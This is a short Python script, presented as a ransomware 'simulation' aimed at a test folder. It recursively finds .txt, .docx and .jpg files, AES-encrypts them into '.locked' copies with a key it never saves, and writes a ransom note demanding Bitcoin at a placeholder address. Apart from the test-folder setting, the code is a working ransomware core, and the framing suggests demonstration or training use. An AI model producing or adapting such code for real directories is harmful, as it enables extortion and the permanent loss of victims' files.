import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

# Function to simulate file "encryption" with AES
def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        # AES encryption requires the data to be a multiple of 16 bytes
        # So, we need to pad the data to match AES block size (16 bytes)
        while len(data) % 16 != 0:
            data += b' '  # Padding with spaces

        # Create AES cipher instance with CBC mode
        cipher = AES.new(key, AES.MODE_CBC)
        # Encrypt the data
        encrypted_data = cipher.encrypt(data)

        # Save the encrypted data along with the IV (Initialization Vector)
        # The IV is necessary to decrypt the data later
        encrypted_file_path = file_path + ".locked"
        with open(encrypted_file_path, "wb") as f:
            # Write the IV and encrypted data to the file
            f.write(cipher.iv + encrypted_data)

        print(f"Encrypted: {file_path} -> {encrypted_file_path}")

    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

# Main function to iterate over files in a test directory
def simulate_ransomware(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith((".txt", ".docx", ".jpg")):  # Filter for target file types
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

    # Ransom note
    ransom_note = """
    Your files have been encrypted!
    To decrypt them, send $100 worth of Bitcoin to:
    1A2B3C4D5E6F7G8H9I0J
    """
    with open(os.path.join(directory, "ransom_note.txt"), "w") as note:
        note.write(ransom_note)
    print("Ransom note created.")

# Run the simulation (set to a test folder like './test_folder')
if __name__ == "__main__":
    test_directory = "./test_folder"
    
    # Generate a random 32-byte key for AES encryption (256-bit key)
    key = get_random_bytes(32)
    
    simulate_ransomware(test_directory, key)
